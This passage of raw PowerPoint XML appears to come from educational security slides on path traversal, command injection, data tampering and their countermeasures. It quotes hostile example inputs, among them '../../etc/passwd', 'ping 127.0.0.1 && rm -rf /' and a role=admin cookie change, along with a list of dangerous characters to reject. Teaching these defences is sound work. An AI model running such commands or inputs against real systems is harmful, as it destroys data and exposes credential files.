              <a:t>sprintf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>() in C).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Input Validation</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Always check length of input before copying to buffers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Use bounded functions (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>strncpy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>(), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>snprintf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>(), etc.).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Compiler-Level Protections</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Stack Canaries</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> → Insert guard values before return addresses.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Address Space Layout Randomization (ASLR)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> → Randomizes memory locations, making exploits harder.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Data Execution Prevention (DEP/NX-bit)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> → Prevents execution of code in non-executable memory regions (like stack).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="17473256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44AE4-B94E-1835-5A08-F46BC5C491EC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Path Traversal</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F00703A7-3D75-7188-764A-BBD97A282660}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Path Traversal (a.k.a. Directory Traversal) is a web security vulnerability that allows attackers to access files and directories stored outside the intended folder.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>How it works (points):</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>User Input Exploitation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> – The application takes user input (like a filename) without proper validation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Manipulated Path</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> – Attackers inject special sequences like ../ or ..\\ to traverse directories.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Example: ../../etc/passwd on Linux.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Example: ..\\..\\windows\\system32\\config\\SAM on Windows.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Access to Sensitive Files</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> – This lets attackers read (or sometimes write/execute) sensitive files such as:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>/etc/passwd (Linux users)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>application configs (database credentials)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>system logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28759286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D9CD5-CD1C-A521-2141-D83676F28888}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D4307DDE-A999-46F1-CFA3-BEDA57B97B11}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="1215749"/>
            <a:ext cx="7704000" cy="3857695"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Input Validation &amp; Sanitization</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Reject ../, ..\, %2e%2e%2f (URL-encoded versions) in file paths.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Use a strict whitelist of allowed file names.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Canonicalization / Normalization</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Convert user-supplied paths to an absolute, canonical path.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Check if the resolved path stays within the intended directory (e.g., /uploads).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Use Fixed Directories</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Never use raw user input to construct file paths.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Predefine directories and append only safe file names.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Principle of Least Privilege</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>The application should only have read/write access to required directories, not system-wide access.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Disable Direct File System Access</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> (if possible)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Store files in a database or use an indirect reference (like a file ID instead of filename).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="145616553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1BBF1-264B-53E0-FC18-23730122C8B4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Command Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F58156C8-D054-BB36-E613-EE5D1D8E85FC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Command Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> happens when an application passes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>unsafe user input</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> to a system command interpreter (like Bash, cmd.exe, PowerShell).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>How it works (points):</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Application takes user input (e.g., form fields, URL parameters) and passes it directly into system commands.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Attacker injects OS commands into the input.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Normal: ping 127.0.0.1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Injected: ping 127.0.0.1 &amp;&amp; rm -rf /</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>The server executes both the intended command and the malicious command.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Potential Impacts</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Reading sensitive files (cat /etc/passwd).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Writing/modifying files (echo hacked &gt; /var/www/index.html).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Remote code execution (installing malware).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Privilege escalation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Full system compromise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36386142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95FC8-14E2-A46B-D315-48ED3669BC21}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BC4D6B67-95C8-87D0-E1C3-01CFD2932DE0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="719999" y="1215750"/>
            <a:ext cx="7789819" cy="3927750"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Avoid Direct Shell Calls</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t>Use safe APIs instead of system calls.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t>Example: use database queries or library functions instead of shell commands.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Input Validation &amp; Sanitization</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t>Strictly validate input (whitelist characters).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t>Reject dangerous characters (;, &amp;, |, &gt;, &lt;, $, \n).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Use Parameterized APIs</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t>Pass arguments as parameters, not as part of the command string.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t>Example in Python (safe):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0" err="1"/>
              <a:t>subprocess.run</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1600" dirty="0"/>
              <a:t>(["ping", "127.0.0.1"])</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Least Privilege Principle</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Run applications with minimal OS permissions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Even if compromised, attacker has limited control.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="199777934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E272B-3A82-45FA-3BAD-20E5B7B0F129}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Data Tampering</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{63D96402-DAC2-EFD8-B449-36AFCBC7D073}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="1063350"/>
            <a:ext cx="7704000" cy="3388200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Data Tampering</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> is a malicious act where attackers </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>alter data in transit, at rest, or during processing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> to gain unauthorized benefits or cause harm.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>How it works (points):</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Definition</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Modifying data without authorization to manipulate outcomes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Where Tampering Happens</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Client-Side</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> → Changing hidden form fields, cookies, or URL parameters.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Server-Side</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> → Modifying stored data in databases or logs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>In Transit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> → Intercepting and altering network traffic (Man-in-the-Middle).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Examples</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Changing price in an e-commerce request: price=100 → price=1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Modifying user role in a cookie: role=user → role=admin</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Altering transaction details in banking apps.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Techniques Used</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Proxy tools (Burp Suite, OWASP ZAP).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Packet sniffers / interceptors (Wireshark, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>mitmproxy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="194886019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AE034-E732-8017-B277-9C6A6E2A616A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{53DB1922-0104-F272-458A-8C920F3828CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>Validate all client-side inputs on the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>server side</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>Digitally sign sensitive data before sending to the client.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>Enforce </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>HTTPS/TLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> to prevent man-in-the-middle tampering.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>Apply strict role-based access controls.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>Prevent users from modifying data fields they don’t own.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
